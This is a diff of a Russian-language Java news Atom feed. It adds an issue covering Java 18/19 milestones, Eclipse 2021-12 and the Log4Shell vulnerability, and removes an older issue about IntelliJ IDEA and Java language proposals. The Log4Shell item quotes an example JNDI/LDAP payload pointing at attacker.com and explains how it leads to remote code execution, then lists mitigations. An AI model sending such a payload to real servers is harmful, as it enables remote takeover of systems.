@@ -4,7 +4,41 @@
   <link rel="alternate" type="text/html" href="https://minijug.ru" />
   <subtitle type="text">Новости Java</subtitle>
   <id>https://minijug.ru/feed.xml</id>
-  <updated>2021-12-05T17:00:00Z</updated>
+  <updated>2021-12-12T17:00:00Z</updated>
+  <entry>
+    <title>Новости Java #34</title>
+    <link rel="alternate" type="text/html" href="https://minijug.ru/java_news_34.html" />
+    <author>
+      <name>Евгений Козлов</name>
+    </author>
+    <id>https://minijug.ru/java_news_34.html</id>
+    <updated>2021-12-12T17:00:00Z</updated>
+    <published>2021-12-12T17:00:00Z</published>
+    <content type="html">&lt;p&gt;&amp;bull; Java 18 перешла в &lt;a href="https://mail.openjdk.java.net/pipermail/jdk-dev/2021-December/006287.html"&gt;первую фазу Rampdown&lt;/a&gt;: главный репозиторий JDK был ответвлён в &lt;a href="https://github.com/openjdk/jdk18"&gt;стабилизационный репозиторий JDK 18&lt;/a&gt;, и новых JEP'ов в этом релизе больше не будет.&lt;/p&gt;
+&lt;p&gt;Одновременно с этим началась &lt;a href="https://bugs.openjdk.java.net/browse/JDK-8273146"&gt;разработка Java 19&lt;/a&gt;. У нового релиза появилась &lt;a href="https://jdk.java.net/19/"&gt;своя страница&lt;/a&gt;, где уже доступна для скачивания первая ранняя сборка JDK 19-ea+1.&lt;/p&gt;
+
+&lt;p class="pt-2"&gt;&amp;bull; В популярной библиотеке логирования Apache Log4J 2.x обнаружили &lt;a href="https://www.lunasec.io/docs/blog/log4j-zero-day/"&gt;серьёзную уязвимость&lt;/a&gt;, позволяющую выполнить на уязвимом сервере произвольный код. Уязвимость может быть эксплуатирована, если Log4J используется для параметризированного логирования непроверенного текста, приходящего от пользователя, например:&lt;/p&gt;
+&lt;pre&gt;log.info(&lt;span style="color: darkred"&gt;"Сообщение от пользователя: {}"&lt;/span&gt;, userMsg);&lt;/pre&gt;
+&lt;p&gt;Злоумышленник может воспользоваться этим и послать строку специального вида (&lt;code&gt;${jndi:ldap://attacker.com/a}&lt;/code&gt;), которую обработает Log4J и загрузит через JNDI вредоносный класс с LDAP-сервера, контролируемого злоумышленником. Класс будет инъектирован в Java-процесс, что позволит атакующему выполнить произвольный код с правами пользователя, от лица которого запущен процесс.&lt;/p&gt;
+&lt;p&gt;Так как Apache Log4J является одной из двух самых популярных библиотек логирования в Java (наряду с Logback), то такая уязвимость поставила под угрозу огромное количество сервисов по всему миру, включая крупнейших.&lt;/p&gt;
+&lt;p&gt;Наиболее надёжным способом защиты от Log4Shell (такое народное название дали этой уязвимости) является обновление Log4J до версии &lt;a href="https://search.maven.org/artifact/org.apache.logging.log4j/log4j/2.15.0/pom"&gt;2.15.0&lt;/a&gt;. Также решением является установка системного свойства &lt;code&gt;log4j2.formatMsgNoLookups=true&lt;/code&gt;, однако оно работает только для версий Log4J &lt;code&gt;2.10.0&lt;/code&gt; и выше. Кроме того, можно полностью удалить class-файл &lt;code&gt;org/apache/logging/log4j/core/lookup/JndiLookup.class&lt;/code&gt; из библиотеки.&lt;/p&gt;
+&lt;p&gt;Уязвимости меньше подвержены &lt;a href="https://gist.github.com/shipilev/cfbe09a31ac32f0cc51078db7898c797"&gt;новые версии Java&lt;/a&gt; (8u191+, 11.0.1+, 13, 15, 17), однако они не защищены от всех возможных векторов атаки, поэтому полагаться на такую защиту крайне нежелательно и настоятельно рекомендуется предпринять один из вышеописанных шагов.&lt;/p&gt;
+
+&lt;p class="pt-2"&gt;&amp;bull; Вышел &lt;a href="https://www.youtube.com/watch?v=3W9bvidcO20"&gt;Eclipse 2021-12&lt;/a&gt; со следующими нововведениями:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;Поддержка разработки на Java 17&lt;/li&gt;
+  &lt;li&gt;Новое действие "Convert String concatenation to Text Block"&lt;/li&gt;
+  &lt;li&gt;Возможность помечать объекты меткой в режиме отладки&lt;/li&gt;
+  &lt;li&gt;Умная вставка текста в поле диалога Open Type (обрезание лишнего)&lt;/li&gt;
+  &lt;li&gt;Новый редактор POM с возможностью автодополнения по имени артефакта/плагина и выбором из выпадающего списка версий&lt;/li&gt;
+  &lt;li&gt;Новое view "Launch Configurations"&lt;/li&gt;
+  &lt;li&gt;Мультикурсоры (одновременное редактирование в нескольких частях файла)&lt;/li&gt;
+  &lt;li&gt;Открывание ссылок во внешнем браузере вместо внутреннего&lt;/li&gt;
+  &lt;li&gt;Улучшения в тёмной теме&lt;/li&gt;
+  &lt;li&gt;Улучшение времени старта IDE&lt;/li&gt;
+  &lt;li&gt;Улучшения в EGit и JS-редакторе&lt;/li&gt;
+&lt;/ul&gt;</content>
+  </entry>
   <entry>
     <title>Новости Java #33</title>
     <link rel="alternate" type="text/html" href="https://minijug.ru/java_news_33.html" />
@@ -498,38 +532,5 @@ WARNING: The Security Manager is deprecated and will be removed in a future rele
   &lt;li&gt;&lt;a href="https://jqwik.net/"&gt;jqwik&lt;/a&gt; &amp;ndash; библиотека для тестирования на основе свойств (property-based testing). Название намекает на отсылку к &lt;a href="https://en.wikipedia.org/wiki/QuickCheck"&gt;QuickCheck&lt;/a&gt;, оригинальной библиотеке на Haskell для написания тестов на основе свойств.&lt;/li&gt;
   &lt;li&gt;&lt;a href="https://github.com/linkedin/URL-Detector"&gt;URL-Detector&lt;/a&gt; &amp;ndash; библиотека для поиска URL в строках. Написана командой безопасности LinkedIn.&lt;/li&gt;
 &lt;/ol&gt;</content>
-  </entry>
-  <entry>
-    <title>Новости Java #25</title>
-    <link rel="alternate" type="text/html" href="https://minijug.ru/java_news_25.html" />
-    <author>
-      <name>Евгений Козлов</name>
-    </author>
-    <id>https://minijug.ru/java_news_25.html</id>
-    <updated>2021-08-02T17:00:00Z</updated>
-    <published>2021-08-02T17:00:00Z</published>
-    <content type="html">&lt;p&gt;&amp;bull; Главное событие этой недели &amp;ndash; &lt;a href="https://www.jetbrains.com/idea/whatsnew/"&gt;выход IntelliJ IDEA 2021.2&lt;/a&gt;, в которой появилось много нового. Перечислим ключевые изменения:&lt;/p&gt;
-&lt;ul&gt;
-  &lt;li&gt;Project-wide анализ проектов на Java. Во вкладке Problems появилась кнопка Enable Project-Wide Analysis, которая включает живую проверку ошибок во всём проекте. При этом проекту для отображения ошибок даже не потребуется компиляция. Новшество доступно только в IntelliJ IDEA Ultimate.&lt;/li&gt;
-  &lt;li&gt;Действия при сохранении. В настройках IDEA теперь есть вкладка Tools → Actions on Save, позволяющая включать действия, которые будут выполняться при сохранении: Reformat Code, Optimize imports, Rearrange code, Run code cleanup и Build project.&lt;/li&gt;
-  &lt;li&gt;Новое UI для управления зависимостями Maven и Gradle. В IDEA теперь есть вкладка Dependencies, в которой можно искать зависимости по имени. При нажатии кнопки Add IDEA сама пропишет указанную зависимость в pom.xml или build.gradle.&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;Новшества, относящиеся непосредственно к Java: более точные и подробные описания инспекций, возможность назначить различные цвета подсветки модификаторов видимости (&lt;code&gt;private&lt;/code&gt;/&lt;code&gt;protected&lt;/code&gt;/&lt;code&gt;public&lt;/code&gt;), новый wizard для создания проектов на JavaFX, а также &lt;a href="https://blog.jetbrains.com/idea/2021/06/intellij-idea-2021-2-eap-4/#java"&gt;новые инспекции&lt;/a&gt;.&lt;/p&gt;
-
-&lt;p class="pt-2"&gt;&amp;bull; Антон Козлов из Azul объявил в рассылке OpenJDK &lt;a href="https://mail.openjdk.java.net/pipermail/announce/2021-July/000304.html"&gt;голосование по созданию проекту CRaC&lt;/a&gt; (Coordinated Restore at Checkpoint).&lt;/p&gt;
-
-&lt;p class="pt-2"&gt;&amp;bull; Брайан Гётц &lt;a href="https://mail.openjdk.java.net/pipermail/amber-spec-experts/2021-July/003052.html"&gt;предложил&lt;/a&gt; добавить в Java возможность объявлять анонимные классы с произвольным количеством интерфейсов. Сейчас в Java анонимный класс может иметь только одного родителя:&lt;/p&gt;
-&lt;pre&gt;&lt;span style="color: blue"&gt;var&lt;/span&gt; foo = &lt;span style="color: blue"&gt;new&lt;/span&gt; AbstractFoo(args);&lt;/pre&gt;
-&lt;p&gt;Брайан предлагает расширить синтаксис, позволив указывать дополнительные интерфейсы с помощью оператора &lt;code&gt;&amp;amp;&lt;/code&gt;:&lt;/p&gt;
-&lt;pre&gt;&lt;span style="color: blue"&gt;var&lt;/span&gt; foo = &lt;span style="color: blue"&gt;new&lt;/span&gt; AbstractFoo(args) &amp; RedFoo;&lt;/pre&gt;
-&lt;p&gt;Такое улучшение сократит пробел между анонимными классами и лямбдами, которые всегда позволяли указывать пересечение:&lt;/p&gt;
-&lt;pre&gt;&lt;span style="color: blue"&gt;var&lt;/span&gt; lambda = (Runnable &amp; Serializable) () -&gt; {
-    &lt;span style="color: green"&gt;// ...&lt;/span&gt;
-};&lt;/pre&gt;
-&lt;p&gt;Сейчас для рефакторинга такой лямбды в класс неизбежно придётся завести именованный класс. Если идея Брайана будет реализована, то лямбду можно будет легко сконвертировать в анонимный класс.&lt;/p&gt;
-
-&lt;p class="pt-2"&gt;&amp;bull; Вышел &lt;a href="https://android-developers.googleblog.com/2021/07/jetpack-compose-announcement.html"&gt;Jetpack Compose 1.0&lt;/a&gt;.&lt;/p&gt;
-
-&lt;p class="pt-2"&gt;&amp;bull; Вышла &lt;a href="https://cassandra.apache.org/_/blog/Apache-Cassandra-4.0-is-Here.html"&gt;Apache Cassandra 4.0&lt;/a&gt;. Новая мажорная версия распределённой СУБД стала доступной спустя почти 6 лет после выхода версии 3.0.&lt;/p&gt;</content>
   </entry>
 </feed>
